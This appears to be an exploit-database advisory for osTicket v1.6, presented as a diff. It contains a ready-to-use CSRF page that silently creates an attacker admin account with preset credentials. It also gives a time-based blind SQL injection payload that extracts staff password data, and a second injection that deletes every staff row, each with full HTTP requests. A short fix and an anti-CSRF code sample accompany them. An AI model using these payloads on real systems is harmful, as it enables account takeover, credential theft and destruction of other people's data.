@@ -1,0 +1,513 @@
+id: 20098
+date: 01/06/2013
+title: osTicket v1.6 ST (stable) CSRF/BLIND SQL Injection Vulnerability
+author: AkaStep
+cves: 
+
+1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
+0     _                   __           __       __                     1
+1   /' \            __  /'__`\        /\ \__  /'__`\                   0
+0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
+1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
+0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
+1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
+0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
+1                  \ \____/ >> Exploit database separated by exploit   0
+0                   \/___/          type (local, remote, DoS, etc.)    1
+1                                                                      1
+0  [+] Site            : 1337day.com                                   0
+1  [+] Support e-mail  : submit[at]1337day.com                         1
+0                                                                      0
+1               #########################################              1
+0               I'm AkaStep member from Inj3ct0r Team                  1
+1               #########################################              0
+0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
+
+=================================================
+Vulnerable Software: osTicket v1.6 ST (stable)
+Official Site:http://www.osticket.com
+$ md5sum osticket_1.6.0.tar.gz
+f8d5e8070c52ae3adf822cfbb1c8b628 *osticket_1.6.0.tar.gz
+Vulns: CSRF+BLIND SQLi
+=================================================
+
+=================================================
+Tested:
+*php.ini MAGIC_QUOTES_GPC OFF*
+Safe mode off
+/*
+OS: Windows XP SP2 (32 bit)
+Apache: 2.2.21.0
+PHP Version: 5.2.17.17
+MYSQL:  5.5.24
+*/
+=================================================
+Vuln Desc:
+osTicket v1.6 ST (stable) is prone to CROSS SITE REQUEST FORGERY,Blind Sql Injection vulns.
+Theris no any protection mechanisms against CSRF vuln.
+Thats why we can add own admin account or ( depends on fantasy we can do more nasty things )
+The following malicious page will do it's own job if currently logged admin visitis it.
+(Just mix it with iframe and it will work for you in silent manner)
+
+On successfully exploitation it will add new admin with following credentials:
+=================================================
+Username: pwner155
+Password: pwner12
+Email: pwner@localhost.tld
+You can login here: http://site.tld/scp/admin.php
+=================================================
+
+CSRF force admin to logout: ($_GET request)
+A)
+<img src="http://192.168.0.15/learn/osticket_1.6.0/scp/logout.php" />
+
+
+B)
+($_POST request)
+===================Osticket_1.6.0 Stable CSRF add admin exploit====================
+
+<body onload="javascript:document.forms[0].submit()">
+
+<form action="http://********************CHANGE TO TARGET******************/scp/admin.php" method="post">
+ <input type="hidden" name="do" value="create">
+ <input type="hidden" name="a" value="">
+ <input type="hidden" name="t" value="staff">
+ <input type="hidden" name="staff_id" value="100">
+
+<input type="text" name="username" value="pwner155">
+ <select name="dept_id">
+                    <option value=0>Select Department</option>
+                                            <option value="1" selected>Support Dept</option>
+                                            <option value="2">Billing Dept</option>
+                                    </select>
+
+
+                <select name="group_id">
+                    <option value=0>Select Group</option>
+                                            <option value="1"selected>Admins</option>
+                                            <option value="2">Managers</option>
+                                            <option value="3">Staff</option>
+                                    </select>
+
+<input type="text" name="firstname" value="pwner">
+<input type="text" name="lastname" value="pwner">
+<input type="text" name="email" size=25 value="pwner@localhost.tld">
+
+                <input type="text" name="phone" value="" >
+                <input type="text" name="phone_ext" size=6 value="" >
+                  <input type="text" name="mobile" value="" >
+
+<textarea name="signature" cols="21" rows="5"></textarea>
+
+
+
+<input type="password" name="npassword" value="pwner12">
+<input type="password" name="vpassword" value="pwner12" >
+
+
+
+<input type="checkbox" name="resetpasswd" >
+                        <input type="radio" name="isactive"  value="1" checked />
+                        <input type="radio" name="isactive"  value="0"  />
+
+
+
+                        <input type="radio" name="isadmin"  value="1" checked />
+                        <input type="radio" name="isadmin"  value="0"  />
+
+
+               <input type="checkbox" name="isvisible" >Show the user on staff's directory
+
+             <input type="checkbox" name="onvacation" checked>
+
+
+  </form>
+
+===================Osticket_1.6.0 Stable CSRF add admin exploit EOF====================
+
+===================== BEGIN SNIP==================================
+
+Blind Sql Injection:
+
+///BLind Sql injection in  osticket_1.6.0
+//Vulnerable code section:
+//$ids comes from Client side and it is not sanitized.
+//scp/kb.php
+    case 'process':
+        if(!$_POST['canned'] || !is_array($_POST['canned']))
+            $errors['err']='You must select at least one item';
+        else{
+            $msg='';
+            $ids=implode(',',$_POST['canned']);
+            $selected=count($_POST['canned']);
+            if(isset($_POST['enable'])) {
+                if(db_query('UPDATE '.KB_PREMADE_TABLE.' SET isenabled=1,updated=NOW() WHERE isenabled=0 AND premade_id IN('.$ids.')'))
+                    $msg=db_affected_rows()." of  $selected selected replies enabled";
+            }elseif(isset($_POST['disable'])) {
+			if(db_query('UPDATE '.KB_PREMADE_TABLE.' SET isenabled=0, updated=NOW() WHERE isenabled=1 AND premade_id IN('.$ids.')'))
+
+                    $msg=db_affected_rows()." of  $selected selected replies disabled";
+            }elseif(isset($_POST['delete'])) {
+                if(db_query('DELETE FROM '.KB_PREMADE_TABLE.' WHERE premade_id IN('.$ids.')'))
+                    $msg=db_affected_rows()." of  $selected selected replies deleted";
+            }
+
+            if(!$msg)
+                $errors['err']='Error occured. Try again';
+        }
+        break;
+    default:
+        $errors['err']='Unknown action';
+    endswitch;
+endif;
+
+Exploit:
+
+=====================================================================================================
+1) or (select if(md5(substr(passwd,1,1))=md5('2'),benchmark(50000000,md5(now())),0) from ost_staff where staff_id=1) AND (1!=0
+=====================================================================================================
+@Print screen exploiting way:
+http://s003.radikal.ru/i202/1205/9a/83f9ed09938d.png
+
+
+In eg:
+
+POST http://192.168.0.15/learn/osticket_1.6.0/scp/kb.php HTTP/1.0
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*
+Referer: http://192.168.0.15/learn/osticket_1.6.0/scp/kb.php
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/4.0 (compatible; MSIE 5.5; Windows 98; DigExt)
+Host: 192.168.0.15
+Content-Length: 165
+Cookie: ASPX=k6568l5vuivoltuec0alcs52v2a107sj
+
+POSTDATA:
+a=process&canned%5B%5D=1) or (select if(md5(substr(passwd,1,1))=md5('2'),benchmark(50000000,md5(now())),0) from ost_staff where staff_id=1) AND (1!=0&disable=Disable
+
+
+
+This means it is vulnerable because md5('2') is first string of my password which comes from ost_staff table and as result if() will operate true condition in our case:
+It will "execute" our  benchmark()  (aka our trigger) which overloads server it gives hint to us result is positive
+=====================================================================================================
+Returned status code:
+
+HTTP/1.1 504 Fiddler - Receive Failure
+Content-Type: text/html; charset=UTF-8
+Connection: close
+Timestamp: 18:57:58.515
+
+[Fiddler] ReadResponse() failed: The server did not return a response for this request.
+
+
+
+=====================================================================================================
+
+Logged Query:
+
+####################################################################################################
+Command: Query
+     db: ost
+   Host: worker.com:1337
+   User: ost
+     Id: 1326
+   Time: 10
+  State: Sending data
+   Info: UPDATE ost_kb_premade SET isenabled=0, updated=NOW() WHERE isenabled=1 AND premade_id IN(1) or (select if(md5(substr(passwd,1,1))=md5('2'),benchmark(50000000,md5(now())),0) from ost_staff where staff_id=1) AND (1!=0)
+####################################################################################################
+
+
+
+
+
+Fix:
+//scp/kb.php
+ case 'process':
+        if(!$_POST['canned'] || !is_array($_POST['canned']))
+            $errors['err']='You must select at least one item';
+        else{
+            $msg='';
+            $ids=db_input(implode(',',$_POST['canned'])); // fixed
+=============================== EOF SNIP ============================================================
+
+
+Again Blind sql injection same as bottom but it is in admin.php ($ids not sanitized again)
+We can use it in ex to drop all staff from ost_staff using this payload:
+==========Exploit=============
+1) or staff_id!=1000000 or (1=1
+==============================
+
+
+POST http://192.168.0.15/learn/osticket_1.6.0/scp/admin.php?t=staff HTTP/1.0
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*
+Referer: http://192.168.0.15/learn/osticket_1.6.0/scp/admin.php?t=staff
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/4.0 (compatible; MSIE 5.5; Windows 98; DigExt)
+Host: 192.168.0.15
+Content-Length: 80
+Cookie: ASPX=ud5hs3fo3o10t5kamsjn8insq83lbhfa
+
+POSTDATA:
+a=staff&do=mass_process&uids%5B%5D=1) or staff_id!=1000000 or (1=1&delete=Delete
+
+
+
+Query will look like to this:
+
+DELETE FROM ost_staff WHERE staff_id IN(1) or staff_id!=1000000 or (1=1) AND staff_id!=1
+
+All ost_staff "truncated"...
+
+=============================== SNIP ============================================================
+//Vulnerable code:
+//scp/admin.php
+//some switch stuff snipped here:
+
+            case 'mass_process':
+                //ok..at this point..look WMA.
+                if($_POST['uids'] && is_array($_POST['uids'])) {
+                    $ids=implode(',',$_POST['uids']);
+                    $selected=count($_POST['uids']);
+                    if(isset($_POST['enable'])) {
+                        $sql='UPDATE '.STAFF_TABLE.' SET isactive=1,updated=NOW() WHERE isactive=0 AND staff_id IN('.$ids.')';
+                        db_query($sql);
+                        $msg=db_affected_rows()." of  $selected selected users enabled";
+
+                    }elseif(in_array($thisuser->getId(),$_POST['uids'])) {
+                        //sucker...watch what you are doing...why don't you just DROP the DB?
+                        $errors['err']='You can not lock or delete yourself!';
+                    }elseif(isset($_POST['disable'])) {
+                        $sql='UPDATE '.STAFF_TABLE.' SET isactive=0, updated=NOW() '.
+                            ' WHERE isactive=1 AND staff_id IN('.$ids.') AND staff_id!='.$thisuser->getId();
+							db_query($sql);
+                        $msg=db_affected_rows()." of  $selected selected users locked";
+                        //Release tickets assigned to the user?? NO? could be a temp thing
+                        // May be auto-release if not logged in for X days?
+                    }elseif(isset($_POST['delete'])) {
+					db_query('DELETE FROM '.STAFF_TABLE.' WHERE staff_id IN('.$ids.') AND staff_id!='.$thisuser->getId());
+                        $msg=db_affected_rows()." of  $selected selected users deleted";
+                        //Demote the user
+                        db_query('UPDATE '.DEPT_TABLE.' SET manager_id=0 WHERE manager_id IN('.$ids.') ');
+                        db_query('UPDATE '.TICKET_TABLE.' SET staff_id=0 WHERE staff_id IN('.$ids.') ');
+                    }else{
+                        $errors['err']='Uknown command!';
+                    }
+                }else{
+                    $errors['err']='No users selected.';
+                }
+            break;
+            default:
+                $errors['err']='Uknown command!';
+        }
+    break;
+    case 'dept':
+        include_once(INCLUDE_DIR.'class.dept.php');
+        $do=strtolower($_POST['do']);
+        switch($do){
+            case 'update':
+                $dept = new Dept($_POST['dept_id']);
+                if($dept && $dept->getId()) {
+                    if($dept->update($_POST,$errors))
+                        $msg='Dept updated successfully';
+                    elseif(!$errors['err'])
+                        $errors['err']='Error updating the department';
+                }else{
+                    $errors['err']='Internal error';
+                }
+                break;
+            case 'create':
+                if(($deptID=Dept::create($_POST,$errors)))
+                    $msg=Format::htmlchars($_POST['dept_name']).' added successfully';
+                elseif(!$errors['err'])
+                    $errors['err']='Unable to add department. Internal error';
+                break;
+            case 'mass_process':
+                if(!$_POST['ids'] || !is_array($_POST['ids'])) {
+                    $errors['err']='You must select at least one department';
+                }elseif(!$_POST['public'] && in_array($cfg->getDefaultDeptId(),$_POST['ids'])) {
+                    $errors['err']='You can not disable/delete a default department. Remove default Dept and try again.';
+                }else{
+                    $count=count($_POST['ids']);
+                    $ids=implode(',',$_POST['ids']);
+                    if($_POST['public']){
+                        $sql='UPDATE '.DEPT_TABLE.' SET ispublic=1 WHERE dept_id IN ('.$ids.')';
+                        if(db_query($sql) && ($num=db_affected_rows()))
+                            $warn="$num of $count selected departments made public";
+                        else
+                            $errors['err']='Unable to make depts public.';
+                    }elseif($_POST['private']){
+                        $sql='UPDATE '.DEPT_TABLE.' SET ispublic=0 WHERE dept_id IN ('.$ids.') AND dept_id!='.db_input($cfg->getDefaultDeptId());
+                        if(db_query($sql) && ($num=db_affected_rows())) {
+                            $warn="$num of $count selected departments made private";
+                        }else
+                            $errors['err']='Unable to make selected department(s) private. Possibly already private!';
+
+                    }elseif($_POST['delete']){
+                        //Deny all deletes if one of the selections has members in it.
+                        $sql='SELECT count(staff_id) FROM '.STAFF_TABLE.' WHERE dept_id IN ('.$ids.')';
+                        list($members)=db_fetch_row(db_query($sql));
+                        $sql='SELECT count(topic_id) FROM '.TOPIC_TABLE.' WHERE dept_id IN ('.$ids.')';
+                        list($topics)=db_fetch_row(db_query($sql));
+                        if($members){
+                            $errors['err']='Can not delete Dept. with members. Move staff first.';
+                        }elseif($topic){
+                             $errors['err']='Can not delete Dept. associated with a help topics. Remove association first.';
+                        }else{
+                            //We have to deal with individual selection because of associated tickets and users.
+                            $i=0;
+                            foreach($_POST['ids'] as $k=>$v) {
+                                if($v==$cfg->getDefaultDeptId()) continue; //Don't delete default dept. Triple checking!!!!!
+                                if(Dept::delete($v)) $i++;
+                            }
+                            if($i>0){
+                                $warn="$i of $count selected departments deleted";
+                            }else{
+                                $errors['err']='Unable to delete selected departments.';
+                            }
+                        }
+                    }
+                }
+            break;
+            default:
+                $errors['err']='Unknown Dept action';
+        }
+    break;
+    default:
+        $errors['err']='Uknown command!';
+    endswitch;
+endif;
+
+
+========================== EOF SNIP ================================
+
+
+
+
+
+
+
+
+
+To protect your application from CSRF vulns realize something like this:(At least it gives idea for you)
+Same logic also applies to $_GET requests.
+(Sorry i commented it in my native language:()
+
+
+=====================BEGIN(i know it is a bit paranoidal like me:)===================
+<?php
+session_start();
+/**
+Bu sade funksiyamin komekliyi ile CSRF - CROSS SITE REQUEST FORGERY ve yaxud diger adi XSRF tipli vulnerabilitylerin heyata kecmesine
+mane olmus oluruq.
+Indiki web app-larin 99%-i CSRF -e vulnerabledir.
+CSRF -tipli vuln cox tehlukeli Vuln tipidir.Wiki-ye ve OWASP || packetstormsecurity.com-a bax etrafli info ucun.
+Cagirilma metodu:
+
+Her bir POST zapros istifade eden formda hidden input yaradirsan
+<input type="hidden" name="anticsrftokenize" id="anticsrftokenize" value="<?php echo htmlentities($_SESSION['csrftokenize']);?>" />
+
+ve POST zapros invoke edildikde funksiyaya  by reference oturulme edirsen asagidaki kimi.
+
+
+Ve her bir skriptin baslangicinda
+
+prepareanticsrf(); funksiyasini cagirirsan.
+
+POST zapros qebul edildikde yoxlayirsan:
+
+csrfcheck($_POST['anticsrftokenize'],$_SESSION['csrftokenize']);
+
+Tokenler uygun olmadiqda xeberdarliq verirem en esasi ise skriptin isini dayandiriram.
+/AkaStep
+
+**/
+
+
+function csrfcheck(&$val1,&$val2)
+{
+
+if(!isset($_POST['anticsrftokenize']) || !isset($_SESSION['csrftokenize']) ||!isset($_SESSION['oldbasecsrf']) || md5($_POST['anticsrftokenize'])!==md5($_SESSION['oldbasecsrf']))
+{
+    die('<script>alert("\u0050\u006F\u0074\u0065\u006E\u0073\u0069\u0061\u006C\u0020\u0043\u0053\u0052\u0046\u0020\u0041\u0074\u0074\u0061\u0063\u006B\u0021");window.top.location.href = "index.php?attack=CSRF#";</script>' . refreshsess());
+}
+
+
+}
+
+
+
+function refreshsess()
+{
+echo '<META HTTP-EQUIV="Refresh" CONTENT="1;URL=?">';
+}
+
+
+
+
+function prepareanticsrf()
+{
+/* ************************** BEOF ANTI CSRF YOXLANMA UCUN. EL VURMA HECNEYE *******************************************/
+if($_SERVER['REQUEST_METHOD']==='GET') // her bir GET requestde yaradiriq.
+{
+$_SESSION['csrftokenize']=sha1(md5(rand(51389,4895615454).md5(time())));
+
+// # debug echo '<font color="red">' . $_SESSION['csrftokenize'] . '</font>'; kk #
+// # debug echo "<script>alert(\"{$_SESSION['csrftokenize']}\");</script>"; #
+/* sessiyani yaradiriq.  Mehz bunun sayesinde server side yoxlanama edirik CSRF attackdir ya yox?*/
+}
+//# Eger sehifeye POST or HEAD OR TRACE zapros gonderirse bizi firlatmaq ucun amma yemeyib gedir bu defe de. #
+if($_SERVER['REQUEST_METHOD']!=='GET' && !isset($_SESSION['csrftokenize'])) die(refreshsess());
+// Burda header() de vermek olardi amma o halda HEAD requestde infinitive loopa duse bilerdik.
+
+if($_SERVER['REQUEST_METHOD']==='POST' && isset($_SESSION['csrftokenize']))
+//Mehz burada biz POST req-ler ucun CSRF token yaradiriq.CSRF tokenleri daha sensitive edirik.
+{
+$_SESSION['oldbasecsrf']=$_SESSION['csrftokenize'];
+$_SESSION['csrftokenize']=sha1(md5(rand(51389,4895615454).md5(time())));
+}
+
+if(count($_SESSION) !==0) $_SESSION=array_map('htmlentities',$_SESSION); // Her ehtimal ucun sanitizasiya edek.
+
+/* ************************** EOF ANTI CSRF YOXLANMA UCUN EL VURMA HECNEYE *******************************************/
+}
+?>
+==================EOF===============
+
+
+
+-----------------------------------------------------
+Vendor notified about vulns:  29 May 2012
+-----------------------------------------------------
+
+
+
+=========================== HAPPY NEW YEAR! ==================================
+
+
+================================================
+SHOUTZ+RESPECTS+GREAT THANKS TO ALL MY FRIENDS:
+================================================
+packetstormsecurity.org
+packetstormsecurity.com
+packetstormsecurity.net
+securityfocus.com
+cxsecurity.com
+security.nnov.ru
+securtiyvulns.com
+securitylab.ru
+secunia.com
+securityhome.eu
+exploitsdownload.com
+osvdb.com
+websecurity.com.ua
+1337day.com
+
+to all Aa Team + to all Azerbaijan Black HatZ
++ *Especially to my bro CAMOUFL4G3 *
+To All Turkish Hackers
+
+Also special thanks to: ottoman38 & HERO_AZE
+================================================
+
+/AkaStep
+
+#  0day.today [2023-03-23]  #
